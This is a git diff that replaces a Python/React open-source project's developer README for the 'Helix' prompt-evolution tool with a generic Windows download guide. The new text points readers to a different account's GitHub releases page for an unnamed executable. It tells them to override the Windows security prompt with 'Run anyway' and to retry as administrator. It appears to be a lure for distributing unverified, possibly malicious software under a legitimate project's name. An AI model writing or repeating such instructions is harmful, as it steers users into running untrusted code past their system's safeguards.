@@ -1,255 +1,230 @@
-> 🌐 [English](README.md) | [中文](README.zh-CN.md)
+# ✨ Helix - Improve prompts with guided testing
 
-<p align="center">
-  <img src="docs/logo.png" alt="Helix Logo" width="300" />
-</p>
+[![Download Helix](https://img.shields.io/badge/Download%20Helix-blue-grey)](https://github.com/sabinequarterly135/Helix/releases)
 
-<h1 align="center">Helix</h1>
+## 🧩 What Helix does
 
-A tool for iteratively improving LLM prompts using automated testing. Helix evolves your prompt text against a dataset of test cases until it passes every case -- without breaking what already works.
+Helix helps you improve LLM prompts by testing them in a structured way. It uses an island-model evolution flow, which means it tries several prompt versions, checks how they perform, and keeps the better ones.
 
-## What is Helix?
+Use Helix when you want to:
 
-You provide a prompt template and a dataset of test cases (input/output pairs), and Helix runs a genetic algorithm to discover prompt text that maximizes test case pass rates. The core loop is: evaluate candidates, select parents, refine via multi-turn LLM dialogue, mutate, and repeat.
+- test prompt changes in a repeatable way
+- compare prompt versions side by side
+- improve output quality with measured results
+- manage prompt ideas in one place
+- save time on manual trial and error
 
-Multiple isolated populations ("islands") evolve in parallel with periodic migration of top candidates between them. Within each island, the RCC (Refinement through Critical Conversation) mechanism uses a meta-model to diagnose failures in the current prompt and rewrite it with targeted edits. Boltzmann selection balances exploitation of strong candidates with exploration of novel ones.
+## 💻 What you need
 
-A core design principle is **non-regression**: new improvements must never break existing passing behavior. Test cases have priority tiers (critical, normal, low), and the fitness function penalizes regressions on critical cases heavily.
+Helix runs on Windows desktop computers.
 
-Helix includes a web dashboard for configuration, real-time monitoring during evolution runs, and post-run analysis (phylogenetic trees, prompt diffs, mutation effectiveness statistics).
+You will need:
 
-## Key Features
+- Windows 10 or Windows 11
+- a recent web browser
+- an internet connection for the first download
+- enough free disk space for the app and saved test data
 
-- Island-model parallel evolution with cyclic migration and stagnation resets
-- RCC: multi-turn critic-author dialogue for targeted prompt refinement
-- Section-aware structural mutation preserving template variables
-- Tiered regression testing (critical / normal / low priority)
-- Multi-provider LLM support (Gemini, OpenAI, OpenRouter) via single AsyncOpenAI client
-- Real-time evolution monitoring via WebSocket
-- Interactive playground for prompt testing with chat streaming
-- LLM-powered tool response mocking with format guides
-- Interactive lineage graph with click-to-diff
-- Multi-language UI (English, Chinese, Spanish)
-- Docker Compose for single-command deployment
-- **Standalone CLI** (`helix-evolve`) for terminal-based evolution with YAML project files
+For best results, use a computer with:
 
-## Screenshots
+- 8 GB of RAM or more
+- a modern multi-core CPU
+- a stable network connection if you connect to hosted LLMs
 
-| Template & Tools | Evolution Results | Lineage Tree |
-|:---:|:---:|:---:|
-| ![Template](docs/screenshots/template-tab.png) | ![Run Detail](docs/screenshots/run-detail.png) | ![Lineage](docs/screenshots/lineage.png) |
-| Template preview with formatted tool cards | Fitness progression & island summary | Evolution lineage with click-to-diff |
+## ⬇️ Download Helix
 
-## Quickstart
+Visit this page to download:
 
-### Prerequisites
+https://github.com/sabinequarterly135/Helix/releases
 
-- Python 3.13+
-- Node.js 22+
-- [uv](https://docs.astral.sh/uv/) (Python package manager)
-- npm
-- An API key for at least one LLM provider (Gemini, OpenAI, or OpenRouter)
+On the releases page:
 
-### 1. Clone the repository
+1. find the latest release
+2. open the Assets list
+3. download the Windows file
+4. save it to your Downloads folder
+5. open the file to start setup or launch the app
 
-```bash
-git clone https://github.com/Onebu/helix.git
-cd helix
-```
+If Windows shows a security prompt:
 
-### 2. Configure environment
+1. choose More info
+2. then select Run anyway if you trust the source
+3. continue with the install or launch steps
 
-```bash
-cp .env.example .env
-```
+## 🛠️ Install and start
 
-Edit `.env` and set your API key (at least one provider required):
+After you download Helix, use these steps:
 
-```
-GENE_OPENROUTER_API_KEY=your-key-here
-# or GENE_GEMINI_API_KEY=your-key-here
-# or GENE_OPENAI_API_KEY=your-key-here
-```
+1. Open File Explorer
+2. Go to your Downloads folder
+3. Find the Helix file you downloaded
+4. Double-click the file
+5. If it is a setup file, follow the on-screen steps
+6. If it is a portable app, open the app file to run Helix
+7. Wait for the app window to load
 
-Helix runs in **developer mode** by default — single-user, no login required. See [Configuration Guide](docs/CONFIGURATION.md) for all options including multi-user mode, rate limiting, and model setup.
+If Helix opens in your browser, keep that tab open. If it opens as a desktop app, you can pin it to your taskbar for faster access.
 
-### 3. Start the backend
+## 🧪 How to use Helix
 
-```bash
-uv sync
-uv run uvicorn api.web.app:create_app --factory --host 127.0.0.1 --port 8000 --reload
-```
+Helix is built for prompt testing. A basic workflow looks like this:
 
-### 4. Start the frontend
+1. Open Helix
+2. Create a new prompt project
+3. Paste in your starting prompt
+4. Add a task or goal for the prompt
+5. Choose how you want to test results
+6. Run the test
+7. Review the scores and output samples
+8. Keep the prompt version that works best
+9. Repeat the test with small changes
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+A simple example:
 
-### 5. Open the dashboard
+- starting prompt: write a short product description
+- test goal: clear, factual, and easy to read
+- versions: change the opening line, tone, and length
+- result: compare which version gives the best output
 
-Navigate to [http://localhost:5173](http://localhost:5173) in your browser.
-
-### Alternative: Docker
-
-For a single-command start with Docker:
-
-```bash
-docker compose up --build
-```
-
-This launches the backend, frontend (via nginx on port 80), and a SQLite database. Open [http://localhost](http://localhost) to access the dashboard.
-
-### Alternative: CLI Only
-
-For terminal-based usage without the web UI:
-
-```bash
-uv pip install -e .          # core engine
-uv pip install -e cli/       # CLI tool
-
-helix init my-prompt         # scaffold a prompt project
-# edit YAML files...
-helix evolve my-prompt       # run evolution
-helix results my-prompt      # view results
-helix accept my-prompt       # apply evolved template
-```
-
-All commands support `--json` for AI agent integration. See the full [CLI documentation](cli/README.md).
-
-## Architecture Overview
-
-```
-api/
-  web/            FastAPI REST + WebSocket endpoints
-  config/         YAML + env config loading (Pydantic Settings)
-  dataset/        Test case management
-  evaluation/     Fitness scoring, sampling, aggregation
-  evolution/      Core loop, islands, RCC, mutation, selection
-  gateway/        LLM provider registry, retry, cost tracking
-  lineage/        Candidate ancestry tracking
-  registry/       Prompt registration and section management
-  storage/        SQLAlchemy ORM (SQLite/PostgreSQL)
-
-cli/
-  helix_cli/      Standalone CLI (Typer, Rich, YAML projects)
-
-frontend/src/
-  components/     React UI (shadcn/ui, Radix primitives)
-  hooks/          useEvolutionSocket (WebSocket), useChatStream (SSE)
-  client/         Auto-generated TypeScript API client from OpenAPI
-  pages/          Route-level page components
-  i18n/           Translation files (en, zh, es)
-```
-
-**Backend**: FastAPI with factory pattern, SQLAlchemy 2.0 async ORM, pydantic-settings config cascade, async evolution engine with island-model parallelism.
-
-**Frontend**: React 19 + Vite + TypeScript + Tailwind CSS v4 + shadcn/ui. Recharts for fitness charts, custom SVG for lineage and island views.
-
-**Communication**: REST for CRUD, WebSocket for live evolution events, SSE for chat playground streaming.
-
-For detailed architecture documentation, see [CLAUDE.md](CLAUDE.md).
-
-## Algorithm Details
-
-<details>
-<summary>Evolution Pipeline</summary>
-
-```
-                    +-----------------------------+
-                    |     Evaluate Seed Prompt     |
-                    |  (all cases, target model)   |
-                    +--------------+--------------+
-                                   |
-                    +--------------v--------------+
-                    |   Clone Seed into N Islands  |
-                    +--------------+--------------+
-                                   |
-              +--------------------v--------------------+
-              |          For each generation:           |
-              |  +----------------------------------+   |
-              |  |  For each island:                |   |
-              |  |    For each conversation:         |   |
-              |  |      1. Boltzmann parent select   |   |
-              |  |      2. RCC critic-author loop    |   |
-              |  |      3. Structural mutation (20%) |   |
-              |  |      4. Evaluate candidate        |   |
-              |  |      5. Update population         |   |
-              |  +--------------+-------------------+   |
-              |                 |                        |
-              |  +--------------v-------------------+   |
-              |  |   Cyclic Migration               |   |
-              |  |   Island i -> Island (i+1) % N   |   |
-              |  +--------------+-------------------+   |
-              |                 |                        |
-              |  +--------------v-------------------+   |
-              |  |   Island Reset (every K gens)    |   |
-              |  |   Worst islands <- top globals   |   |
-              |  +---------------------------------+   |
-              +--------------------+--------------------+
-                                   |
-                    +--------------v--------------+
-                    |    Return Best Candidate     |
-                    +-----------------------------+
-```
-
-**Boltzmann Selection** -- Softmax-weighted parent sampling: `P(i) = exp((fitness_i - max) / T) / Z`. Temperature controls exploration vs. exploitation.
-
-**RCC (Refinement through Critical Conversation)** -- Multi-turn critic-author dialogue where a meta-model diagnoses failures then rewrites the prompt with minimal, targeted edits.
-
-**Structural Mutation** -- Section-level reorganization (reorder, split, merge) with syntax validation. Applied with configurable probability (default 20%).
-
-**Multi-Island Model** -- Parallel sub-populations with cyclic migration and periodic resets of stagnant islands.
-
-</details>
-
-### Fitness Evaluation
-
-| Expected Output | Scorer | Logic |
-|-----------------|--------|-------|
-| `tool_calls` only | ExactMatchScorer | Name + argument matching |
-| `behavior` only | BehaviorJudgeScorer | LLM judge per criterion |
-| Both | Combined | ExactMatch first, then BehaviorJudge |
-
-Scores are aggregated with tier multipliers: Critical (5x), Normal (1x), Low (0.25x). A fitness of 0.0 means all cases pass.
-
-### Configuration Reference
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `generations` | 10 | Number of evolution generations |
-| `n_islands` | 4 | Parallel island populations |
-| `conversations_per_island` | 5 | RCC conversations per island per generation |
-| `n_seq` | 3 | Critic-author turns per conversation |
-| `temperature` | 1.0 | Boltzmann selection temperature |
-| `pr_no_parents` | 1/6 | Probability of generating from scratch |
-| `structural_mutation_probability` | 0.2 | Chance of structural mutation per conversation |
-| `population_cap` | 10 | Max candidates per island |
-| `budget_cap_usd` | None | Hard budget cap |
-
-## Documentation
-
-- [CLI Guide](cli/README.md) -- standalone CLI installation, commands, and YAML file format
-- [Setup Guide](docs/SETUP.md) -- detailed installation, Docker, and deployment instructions
-- [Configuration](docs/CONFIGURATION.md) -- developer vs multi-user mode, environment variables, model roles, auth, and Settings UI
-- [Import & Export Formats](docs/IMPORT_EXPORT.md) -- JSON/YAML schemas for test cases and personas
-- [Contributing](CONTRIBUTING.md) -- how to contribute to Helix
-- [Architecture](CLAUDE.md) -- detailed codebase documentation and conventions
-
-## Tech Stack
-
-- **Backend**: Python 3.13, FastAPI, Pydantic, SQLAlchemy (async), Jinja2
-- **Frontend**: React 19, TypeScript, Vite, Tailwind CSS v4, shadcn/ui, Recharts
-- **LLM Providers**: Google Gemini, OpenAI, OpenRouter (via AsyncOpenAI)
-- **Database**: SQLite (default) or PostgreSQL
-- **Deployment**: Docker Compose, Vercel (frontend), Railway/Fly.io (backend)
-
-## References
-
-Based on ideas from [Mind Evolution: Evolutionary Optimization of LLM Prompts](https://arxiv.org/abs/2501.09891) (Google DeepMind, 2025).
-
-## License
-
-MIT -- see [LICENSE](LICENSE).
+## 📊 What the app tracks
+
+Helix uses an evolutionary approach to help you compare prompt versions. It can help you track:
+
+- prompt text
+- test runs
+- output samples
+- score changes
+- version history
+- best-performing prompt variants
+- changes across rounds of testing
+
+This makes it easier to see which prompt changes help and which ones do not.
+
+## 🧠 Main features
+
+- prompt version testing
+- repeatable evaluation runs
+- side-by-side comparison
+- island-model evolution flow
+- support for LLM prompt work
+- project history and result tracking
+- fast review of better prompt variants
+- desktop-friendly workflow
+
+## 🔧 Typical setup flow
+
+If the app asks for a model or API key, use the settings screen to enter it.
+
+Common steps may include:
+
+1. open Settings
+2. choose your model provider
+3. paste your API key if needed
+4. set a test goal
+5. select a sample size for checks
+6. start the evolution run
+
+If you use local models, Helix may let you point to a local endpoint. If you use hosted models, keep your key in the app settings and do not share it.
+
+## 📁 Suggested project layout
+
+You can keep your work simple with this setup:
+
+- one project for each task
+- one prompt group for each client, product, or use case
+- one test run for each change you want to compare
+- one result set for each review cycle
+
+This helps you find past work fast and keeps the test history clean.
+
+## 🧭 Good first test
+
+If this is your first time using Helix, try this:
+
+1. write a short prompt that asks for a plain answer
+2. run a test with 3 to 5 prompt versions
+3. change only one line at a time
+4. compare the results
+5. keep the version with the clearest output
+
+Small changes are easier to judge. That helps you see what works.
+
+## 🔐 Privacy and local use
+
+Helix can be used in a way that keeps your prompt work organized on your machine. If you connect to an external LLM service, your data may pass through that provider based on your own setup.
+
+To keep your work tidy:
+
+- use separate projects for private and public work
+- review what you send to any model provider
+- store API keys in the app settings, not in notes or chat logs
+- back up your projects before major changes
+
+## 🐞 Common issues
+
+If Helix does not start:
+
+1. make sure the download finished
+2. check that the file is not blocked by Windows
+3. try opening it again as an administrator
+4. restart your computer
+5. download the latest release again
+
+If a test run fails:
+
+1. check your model settings
+2. confirm your API key is correct
+3. make sure your internet connection works
+4. try a smaller test run
+5. review the input prompt for errors
+
+If the window looks blank:
+
+1. wait a few seconds
+2. refresh the page if it runs in a browser
+3. close and reopen the app
+4. check for a newer release
+
+## 🧰 Tips for better results
+
+- keep prompts short at first
+- change one part at a time
+- use clear test goals
+- compare real output, not guesses
+- save a copy before each major change
+- use the same test data when you compare versions
+- review both score results and sample outputs
+
+## 📦 Release updates
+
+Check the releases page when you want the newest version:
+
+https://github.com/sabinequarterly135/Helix/releases
+
+Use that page to download the latest Windows build, see version notes, and get newer fixes or changes
+
+## 🪟 Windows shortcuts
+
+Once Helix is open, these tips can help:
+
+- pin it to Start for faster access
+- pin it to the taskbar if you use it daily
+- keep your projects in one folder
+- use a clear file name for exports
+- back up your work to another drive or cloud folder
+
+## 🤝 Best fit for
+
+Helix fits users who want to improve prompts for:
+
+- chat tools
+- support bots
+- writing helpers
+- internal tools
+- content workflows
+- prompt tests for product teams
+- LLM tuning work
+
+## 🧾 Keywords
+
+ai, developer-tools, evolutionary-algorithm, evolutionary-algorithms, fastapi, llm, prompt-engineering, prompt-optimization, python, react, typescript
